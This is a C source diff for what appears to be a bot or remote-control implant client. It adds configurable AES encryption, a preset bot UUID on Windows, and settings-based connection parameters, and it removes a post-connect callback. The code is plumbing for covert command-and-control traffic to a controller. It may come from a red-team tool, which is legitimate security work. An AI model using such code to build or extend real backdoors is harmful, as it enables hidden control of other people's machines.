@@ -38,6 +38,7 @@
 #include "command.h"
 #include "shell.h"
 #include "tcp.h"
+#include "aes.h"
 
 // Helper function to generate UUIDv4 values.
 // Output buffer is assumed to be exactly 16 bytes long.
@@ -132,19 +133,47 @@ int copy_stream(int source, int destination, ssize_t count)
 }
 #endif
 
-// Initialize the parser.
-void parser_init(Parser *parser, const char *hostname, int port, ConnectionCallback callback, void *userdata)
+// Helper function to tell if a buffer is zeroed out.
+int is_empty(const unsigned char *buffer, size_t size)
 {
-    parser->hostname = (char *) hostname;
-    parser->port = port;
-    parser->callback = callback;
-    parser->userdata = userdata;
+    unsigned char j = 0;
+    unsigned int i;
+    for (i = 0; i < size; i++) {
+        j |= buffer[i];
+    }
+    return j == 0 ? 1 : 0;
+}
+
+// Initialize the parser.
+void parser_init(Parser *parser, const Settings *settings)
+{
+    memcpy(parser->hostname, settings->hostname, sizeof(parser->hostname));
+    parser->port = settings->port;
     parser->fd = -1;
     parser->header.cmd_id = 0;
     parser->header.cmd_len = 0;
     parser->header.data_len = 0;
-    uuid4(parser->uuid);
-    memset(&parser->buffer, 0, sizeof(parser->buffer));
+#ifdef _WIN32
+    if (is_empty(settings->uuid, sizeof(settings->uuid))) {
+        uuid4((unsigned char *) parser->uuid);
+    } else {
+        memcpy(parser->uuid, settings->uuid, sizeof(parser->uuid));
+    }
+#else
+    uuid4((unsigned char *) parser->uuid);
+#endif
+#ifndef TICK_FEATURES_NO_CRYPTO
+    if (is_empty(settings->aes_key, sizeof(settings->aes_key))) {
+        parser->use_aes = 0;
+        memset(parser->aes_key, 0, sizeof(parser->aes_key));
+        memset(parser->aes_iv, 0, sizeof(parser->aes_iv));
+    } else {
+        parser->use_aes = 1;
+        memcpy(parser->aes_key, settings->aes_key, sizeof(parser->aes_key));
+        memcpy(parser->aes_iv, settings->aes_iv, sizeof(parser->aes_iv));
+    }
+#endif
+    memset(parser->buffer, 0, sizeof(parser->buffer));
 }
 
 // Closes the file descriptor and resets some internal variables.
@@ -226,13 +255,6 @@ void parser_connect(Parser *parser)
 
             // Send the bot ID immediately after a successful (re)connection.
             send_block(parser->fd, parser->uuid, sizeof(parser->uuid));
-
-            // Invoke the callback. MUST be done after sending the ID.
-            if (parser->callback != NULL && ((ConnectionCallback) parser->callback)(parser, parser->userdata) != 0) {
-                LOG("Callback told us to die!\n");
-                parser_close(parser);
-                return;
-            }
 
         // If reconnection is not possible, set a fake quit command.
         // This will kill the listener on error.
